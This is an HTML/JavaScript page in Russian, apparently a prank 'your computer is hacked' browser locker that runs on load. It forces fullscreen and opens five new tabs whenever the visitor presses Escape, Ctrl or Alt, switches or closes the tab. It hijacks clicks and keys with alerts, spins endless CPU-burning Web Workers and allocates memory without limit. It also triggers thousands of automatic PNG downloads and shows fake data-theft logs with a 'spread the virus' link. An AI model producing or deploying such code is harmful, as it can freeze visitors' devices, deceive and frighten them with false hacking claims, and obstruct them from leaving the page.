<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>☠️ GG!</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Creepster', cursive;
            background: #000;
            overflow: hidden;
            animation: glitch-bg 0.5s infinite;
        }
        @keyframes glitch-bg {
            0% { background: linear-gradient(to bottom, #2a0000, #000000), repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255, 0, 0, 0.3) 10px, rgba(255, 0, 0, 0.3) 20px); }
            50% { background: linear-gradient(to bottom, #1a0000, #000000), repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255, 0, 0, 0.5) 10px, rgba(255, 0, 0, 0.5) 20px); }
            100% { background: linear-gradient(to bottom, #2a0000, #000000), repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255, 0, 0, 0.3) 10px, rgba(255, 0, 0, 0.3) 20px); }
        }
        @keyframes pulse {
            0% { transform: scale(1); text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000, 0 0 45px #ff0000; }
            50% { transform: scale(1.3); text-shadow: 0 0 25px #ff0000, 0 0 40px #000; }
            100% { transform: scale(1); text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000; }
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
            20%, 40%, 60%, 80% { transform: translateX(10px); }
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-5px, 5px); }
            40% { transform: translate(-5px, -5px); }
            60% { transform: translate(5px, 5px); }
            80% { transform: translate(5px, -5px); }
            100% { transform: translate(0); }
        }
        @keyframes flicker {
            0% { opacity: 1; }
            100% { opacity: 0.5; }
        }
        @keyframes float {
            0% { transform: translate(0, 0) rotate(0deg); }
            50% { transform: translate(80px, 60px) rotate(15deg); }
            100% { transform: translate(0, 0) rotate(0deg); }
        }
        .pulse { animation: pulse 1.2s infinite; }
        .shake { animation: shake 0.3s infinite; }
        .glitch { animation: glitch 0.2s infinite; }
        .flicker { animation: flicker 0.15s infinite alternate; }
        .float { animation: float 2s infinite; }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
        canvas { transition: opacity 0.5s ease-in-out; position: relative; }
        canvas::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: repeating-linear-gradient(45deg, transparent, transparent 5px, rgba(255, 0, 0, 0.2) 5px, rgba(255, 0, 0, 0.2) 10px);
            animation: glitch 0.3s infinite;
        }
        #skull {
            font-size: 150px;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #000;
            animation: pulse 1.2s infinite, flicker 0.2s infinite alternate;
        }
        .virus-notif {
            position: fixed;
            background: rgba(255, 0, 0, 0.9);
            color: #000;
            padding: 25px;
            border: 2px solid #ff0000;
            border-radius: 5px;
            box-shadow: 0 0 20px #ff0000, 0 0 15px #000 inset;
            z-index: 1000;
            font-size: 1.8rem;
            text-align: center;
            width: 400px;
            animation: pulse 0.8s infinite, float 2s infinite, glitch 0.2s infinite;
            filter: blur(2px);
            transform: rotate(0deg);
        }
        .lock-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            color: #ff0000;
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            font-size: 3rem;
            text-align: center;
            text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
            animation: shake 0.3s infinite, glitch 0.2s infinite;
        }
        .bloody-text {
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
        }
    </style>
</head>
<body class="text-white min-h-screen flex flex-col items-center justify-center p-4 sm:p-8">
    <div id="lock-screen" class="lock-screen">
        СИСТЕМА ВЗЛОМАНА! ВЫХОД НЕВОЗМОЖЕН!
    </div>
    <div class="max-w-4xl w-full bg-black/95 backdrop-blur-md rounded-xl shadow-2xl p-6 sm:p-10 border border-red-600/70 fade-in" style="z-index: 10;">
        <h1 class="text-6xl sm:text-7xl font-bold text-center mb-6 text-red-600 drop-shadow-[0_0_20px_rgba(255,0,0,1)] glitch bloody-text shake">
            ☠️ ВАШ КОМПЬЮТЕР ВЗЛОМАН!
        </h1>
        <div id="skull" class="text-center mb-6">☠️</div>
        <div id="warning" class="bg-red-900/90 text-white p-4 rounded-lg mb-6 text-center shadow-md flicker bloody-text shake" style="font-size: 2rem;">
            <strong>☠️ ВИРУС АКТИВИРОВАН!</strong> 5000 PNG загружаются, память и CPU перегружены! Полноэкранный режим заблокирован, Esc открывает 5 вкладок! Экран заражён!
        </div>

        <div id="status" class="text-2xl sm:text-3xl text-center mb-6 text-green-400 flicker glitch bloody-text" style="font-family: monospace;">
            Статус: ВЗЛОМ В ПРОЦЕССЕ...
        </div>

        <div id="download-status" class="text-xl text-center mb-6 text-red-500 flicker bloody-text" style="font-family: monospace;">
            Доступ к загрузкам получен! Загрузка данных: <span id="download-count">0</span>/5000
        </div>

        <div id="data-logs" class="text-sm text-green-400 mb-6 p-4 bg-black/70 rounded-lg" style="font-family: monospace; max-height: 120px; overflow-y: auto;">
            Логи данных: <div id="log-output" class="bloody-text"></div>
        </div>

        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
            <canvas id="canvas1" width="800" height="800" class="rounded-lg border border-red-600/70 mx-auto"></canvas>
            <canvas id="canvas2" width="800" height="800" class="rounded-lg border border-red-600/70 mx-auto"></canvas>
        </div>

        <div id="share-link" class="bg-black/90 p-4 rounded-lg text-center">
            Распространите вирус: <span id="linkText" class="text-green-400 break-all bloody-text"></span>
        </div>
    </div>

    <script>
        let isRunning = false;
        let downloadCount = 0;
        let workers = [];
        const maxDownloads = 5000;
        const canvas1 = document.getElementById('canvas1');
        const canvas2 = document.getElementById('canvas2');
        const ctx1 = canvas1.getContext('2d');
        const ctx2 = canvas2.getContext('2d');
        const status = document.getElementById('status');
        const shareLink = document.getElementById('share-link');
        const linkText = document.getElementById('linkText');
        const downloadStatus = document.getElementById('download-status');
        const downloadCountDisplay = document.getElementById('download-count');
        const skull = document.getElementById('skull');
        const dataLogs = document.getElementById('data-logs');
        const logOutput = document.getElementById('log-output');
        const lockScreen = document.getElementById('lock-screen');
        let memoryHog = [];
        let isFullscreenStable = false;

        // Автоматический запуск
        setTimeout(() => {
            isRunning = true;
            canvas1.style.display = 'block';
            canvas2.style.display = 'block';
            skull.style.display = 'block';
            downloadStatus.style.display = 'block';
            dataLogs.style.display = 'block';
            downloadCount = 0;
            downloadCountDisplay.textContent = downloadCount;
            drawMandelbrot(4);
            initParticles();
            animateParticles();
            startWebWorkers();
            downloadAllPNGs();
            updateDataLogs();
            stickyInterface();
            stickyMouse();
            keepFocus();
            createVirusNotification();
            checkTabFocus();
            memoryHogging();
            heavyLoad();
            activateFullscreen();
            const url = window.location.href;
            linkText.textContent = url + '?viral=true';
            shareLink.style.display = 'block';
        }, 500);

        // Функция для активации полноэкранного режима
        function activateFullscreen() {
            if (isRunning && !document.fullscreenElement && !isFullscreenStable) {
                document.documentElement.requestFullscreen({ navigationUI: 'hide' }).then(() => {
                    isFullscreenStable = true;
                    setTimeout(() => {
                        isFullscreenStable = false;
                    }, 5000);
                }).catch(err => {
                    console.log('Fullscreen blocked:', err);
                    setTimeout(activateFullscreen, 1000);
                });
            }
        }

        // Обработчик выхода из полноэкранного режима
        document.addEventListener('fullscreenchange', () => {
            if (isRunning && !document.fullscreenElement) {
                lockScreen.style.display = 'flex';
                for (let i = 0; i < 5; i++) {
                    window.open(window.location.href + '?viral=true', '_blank');
                }
                setTimeout(() => {
                    lockScreen.style.display = 'none';
                    activateFullscreen();
                }, 3000);
            }
        });

        // Обработчик закрытия или сворачивания вкладки
        function preventClose() {
            if (isRunning) {
                for (let i = 0; i < 5; i++) {
                    window.open(window.location.href + '?viral=true', '_blank');
                }
            }
        }
        window.addEventListener('unload', preventClose);
        document.addEventListener('visibilitychange', () => {
            if (isRunning && document.visibilityState === 'hidden') {
                for (let i = 0; i < 5; i++) {
                    window.open(window.location.href + '?viral=true', '_blank');
                }
            }
        });

        // Перехват нажатия Esc и других системных клавиш
        document.addEventListener('keydown', (e) => {
            if (isRunning && (e.key === 'Escape' || e.altKey || e.ctrlKey)) {
                e.preventDefault();
                lockScreen.style.display = 'flex';
                for (let i = 0; i < 5; i++) {
                    window.open(window.location.href + '?viral=true', '_blank');
                }
                setTimeout(() => {
                    alert('Клавиша заблокирована! Система под контролем!');
                    lockScreen.style.display = 'none';
                }, 100);
            }
        });

        // Периодическая проверка активности вкладки
        function checkTabFocus() {
            if (isRunning && document.hidden) {
                for (let i = 0; i < 5; i++) {
                    window.open(window.location.href + '?viral=true', '_blank');
                }
            }
            setTimeout(checkTabFocus, 100);
        }

        // Удержание фокуса на странице
        function keepFocus() {
            if (!isRunning) return;
            window.focus();
            setTimeout(keepFocus, 100);
        }

        // Усиленная липкость мыши
        function stickyMouse() {
            if (!isRunning) return;
            document.addEventListener('mousemove', (e) => {
                if (isRunning && Math.random() > 0.1) {
                    const offsetX = (Math.random() - 0.5) * 700;
                    const offsetY = (Math.random() - 0.5) * 700;
                    e.target.style.cursor = Math.random() > 0.5 ? 'none' : 'wait';
                    window.dispatchEvent(new MouseEvent('mousemove', {
                        clientX: e.clientX + offsetX,
                        clientY: e.clientY + offsetY
                    }));
                    if (Math.random() > 0.2 && isFullscreenStable) {
                        setTimeout(() => {
                            alert('Курсор захвачен вирусом!');
                        }, 100);
                    }
                }
            }, { once: true });
            setTimeout(stickyMouse, 50);
        }

        // Залипание интерфейса (перехват кликов/клавиш)
        function stickyInterface() {
            if (!isRunning) return;
            document.addEventListener('click', (e) => {
                if (isRunning && Math.random() > 0.5) {
                    e.preventDefault();
                    setTimeout(() => {
                        alert('СИСТЕМА ПОД КОНТРОЛЕМ!');
                    }, 100);
                }
            });
            document.addEventListener('keydown', (e) => {
                if (isRunning && Math.random() > 0.5 && !e.altKey && !e.ctrlKey && e.key !== 'Escape') {
                    e.preventDefault();
                    setTimeout(() => {
                        alert('Клавиатура заблокирована вирусом!');
                    }, 100);
                }
            });
            setTimeout(stickyInterface, 50);
        }

        // Летающие всплывающие окна
        function createVirusNotification() {
            if (!isRunning) return;
            const messages = [
                'СИСТЕМА ВЗЛОМАНА!',
                'ДАННЫЕ УНИЧТОЖЕНЫ!',
                'ВИРУС КОНТРОЛИРУЕТ ВСЁ!',
                'ПАМЯТЬ ЗАПОЛНЕНА!',
                'CPU УНИЧТОЖЕН!'
            ];
            const notif = document.createElement('div');
            notif.className = 'virus-notif';
            notif.textContent = messages[Math.floor(Math.random() * messages.length)];
            notif.style.left = `${Math.random() * (window.innerWidth - 400)}px`;
            notif.style.top = `${Math.random() * (window.innerHeight - 100)}px`;
            notif.style.transform = `rotate(${Math.random() * 30 - 15}deg)`;
            document.body.appendChild(notif);
            setTimeout(() => notif.remove(), 2000);
            setTimeout(createVirusNotification, Math.random() * 450 + 50);
        }

        // Функция для скачивания canvas как PNG
        function downloadCanvas(canvas, filename) {
            const link = document.createElement('a');
            link.download = filename;
            link.href = canvas.toDataURL('image/png');
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            downloadCount++;
            downloadCountDisplay.textContent = downloadCount;
            if (downloadCount === 1) {
                downloadStatus.textContent = 'Доступ к загрузкам получен! Загрузка данных: 1/5000';
            }
            if (downloadCount >= maxDownloads) {
                downloadStatus.textContent = 'Загрузка завершена: 5000/5000';
            }
        }

        // Имитация логов данных
        function generateFakeDataLog() {
            const actions = ['Click', 'Scroll', 'Keypress', 'MouseMove', 'DataAccess', 'MemoryOverload', 'CPUSpike'];
            const userId = Math.floor(Math.random() * 1000);
            const action = actions[Math.floor(Math.random() * actions.length)];
            const timestamp = new Date().toISOString();
            return `[${timestamp}] UserID: ${userId}, Action: ${action}, Data: ${Math.random().toString(36).slice(2)}`;
        }

        function updateDataLogs() {
            if (!isRunning) return;
            logOutput.innerHTML += generateFakeDataLog() + '<br>';
            logOutput.scrollTop = logOutput.scrollHeight;
            setTimeout(updateDataLogs, 200);
        }

        // Многократные Web Workers для нагрузки
        function startWebWorkers() {
            for (let i = 0; i < 5; i++) {
                if (workers[i]) continue;
                const workerCode = `
                    function factorial(n) {
                        if (n <= 1) return 1;
                        return n * factorial(n - 1);
                    }
                    self.onmessage = function(e) {
                        while (true) {
                            factorial(1000);
                        }
                    };
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                workers[i] = new Worker(URL.createObjectURL(blob));
                workers[i].postMessage('start');
            }
        }

        // Злоупотребление памятью
        function memoryHogging() {
            if (!isRunning) return;
            try {
                for (let i = 0; i < 1000; i++) {
                    memoryHog.push(new Array(1000000).join('x' + Math.random()));
                }
            } catch (e) {
                console.log('Memory limit reached:', e);
            }
            setTimeout(memoryHogging, 100);
        }

        // Интенсивная CPU-нагрузка: факториалы и простые числа
        function cpuIntensiveTask() {
            let num = 2;
            let primes = 0;
            let factorial = 1;
            const startTime = Date.now();
            while (Date.now() - startTime < 1000) {
                let isPrime = true;
                for (let i = 2; i < Math.sqrt(num); i++) {
                    if (num % i === 0) {
                        isPrime = false;
                        break;
                    }
                }
                if (isPrime) primes++;
                num++;
                factorial *= num > 1000 ? 1 : num;
            }
            return primes;
        }

        // Фрактал Мандельброта с увеличенной сложностью
        function drawMandelbrot(scale) {
            const width = canvas1.width;
            const height = canvas1.height;
            const maxIter = 200;
            for (let x = 0; x < width; x++) {
                for (let y = 0; y < height; y++) {
                    let real = (x - width / 1.5) / (width / scale);
                    let imag = (y - height / 2) / (height / scale);
                    let cReal = real;
                    let cImag = imag;
                    let iter = 0;
                    while (iter < maxIter && (real * real + imag * imag) < 4) {
                        let temp = real * real - imag * imag + cReal;
                        imag = 2 * real * imag + cImag;
                        real = temp;
                        iter++;
                    }
                    const color = iter === maxIter ? 0 : (iter * 255 / maxIter);
                    ctx1.fillStyle = `rgb(${color}, ${color * 0.5}, ${255 - color})`;
                    ctx1.fillRect(x, y, 1, 1);
                }
            }
            // Добавление "помех"
            for (let i = 0; i < 100; i++) {
                ctx1.strokeStyle = 'rgba(255, 0, 0, 0.5)';
                ctx1.beginPath();
                ctx1.moveTo(Math.random() * width, Math.random() * height);
                ctx1.lineTo(Math.random() * width, Math.random() * height);
                ctx1.stroke();
                ctx1.fillStyle = 'rgba(255, 0, 0, 0.7)';
                ctx1.fillRect(Math.random() * width, Math.random() * height, 2, 2);
            }
        }

        // Частицы с увеличенной плотностью
        let particles = [];
        function initParticles() {
            particles = [];
            for (let i = 0; i < 5000; i++) {
                particles.push({
                    x: Math.random() * canvas2.width,
                    y: Math.random() * canvas2.height,
                    vx: (Math.random() - 0.5) * 3,
                    vy: (Math.random() - 0.5) * 3
                });
            }
        }
        function animateParticles() {
            ctx2.clearRect(0, 0, canvas2.width, canvas2.height);
            particles.forEach(p => {
                p.x += p.vx;
                p.y += p.vy;
                if (p.x < 0 || p.x > canvas2.width) p.vx *= -1;
                if (p.y < 0 || p.y > canvas2.height) p.vy *= -1;
                ctx2.fillStyle = '#ff0000';
                ctx2.fillRect(p.x, p.y, 3, 3);
            });
            // Добавление "помех"
            for (let i = 0; i < 100; i++) {
                ctx2.strokeStyle = 'rgba(255, 0, 0, 0.5)';
                ctx2.beginPath();
                ctx2.moveTo(Math.random() * canvas2.width, Math.random() * canvas2.height);
                ctx2.lineTo(Math.random() * canvas2.width, Math.random() * canvas2.height);
                ctx2.stroke();
                ctx2.fillStyle = 'rgba(255, 0, 0, 0.7)';
                ctx2.fillRect(Math.random() * canvas2.width, Math.random() * canvas2.height, 2, 2);
            }
            if (isRunning) requestAnimationFrame(animateParticles);
        }

        // Функция для скачивания 5000 PNG
        function downloadAllPNGs() {
            let mandelbrotCount = 0;
            let particlesCount = 0;
            const downloadInterval = setInterval(() => {
                if (!isRunning || downloadCount >= maxDownloads) {
                    clearInterval(downloadInterval);
                    return;
                }
                if (mandelbrotCount < 2500) {
                    const scale = 4 + (mandelbrotCount * 0.01);
                    drawMandelbrot(scale);
                    downloadCanvas(canvas1, `mandelbrot_${mandelbrotCount + 1}.png`);
                    mandelbrotCount++;
                } else if (particlesCount < 2500) {
                    animateParticles();
                    downloadCanvas(canvas2, `particles_${particlesCount + 1}.png`);
                    particlesCount++;
                }
            }, 30);
        }

        // Основной цикл нагрузки
        function heavyLoad() {
            if (!isRunning) return;
            const primes = cpuIntensiveTask();
            status.textContent = `Статус: ВЗЛОМ ПРОДОЛЖАЕТСЯ! Простых чисел: ${primes}`;
            if (Math.random() > 0.5) drawMandelbrot(4);
            if (particles.length === 0) initParticles();
            animateParticles();
            setTimeout(heavyLoad, 50);
        }
    </script>
</body>
</html>



